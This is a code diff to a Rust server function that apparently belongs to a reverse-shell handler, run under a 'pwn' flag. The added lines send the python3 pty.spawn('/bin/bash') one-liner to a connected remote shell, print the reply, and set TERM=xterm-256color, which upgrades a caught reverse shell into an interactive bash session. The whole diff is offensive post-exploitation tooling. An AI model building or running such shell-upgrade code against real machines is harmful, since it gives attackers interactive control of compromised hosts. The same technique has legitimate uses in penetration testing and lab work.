@@ -55,11 +55,25 @@ pub async fn server(host: &str, port: u16, cli: &Cli) -> Result<(), String> {
 
     // Upgrade Reverse shell
     if cli.pwn {
-        // let mut buf: [u8; 1024];
+        let mut buf: [u8; 1024] = [0; 1024];
 
+        // launch /bin/bash
         match writer.write_all(b"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n").await {
             Ok(_)  => {},
             Err(_) => eprintln!("Failed to initialize reverse shell."),
+        }
+
+        let resp = match reader.read(&mut buf).await {
+            Ok(n) => n,
+            Err(_) => {eprintln!("Failed to read anwser from remote host while upgrading shell"); 0},
+        };
+
+        println!("Anwser of initalization: {:?}", String::from_utf8(buf[..resp].to_vec()));
+
+        // set TERM env variable
+        match writer.write_all(b"export TERM=xterm-256color\n").await {
+            Ok(_)  => {println!("Set XTERM variable")},
+            Err(_) => eprintln!("Failed to set XTERM variable."),
         }
     }
 
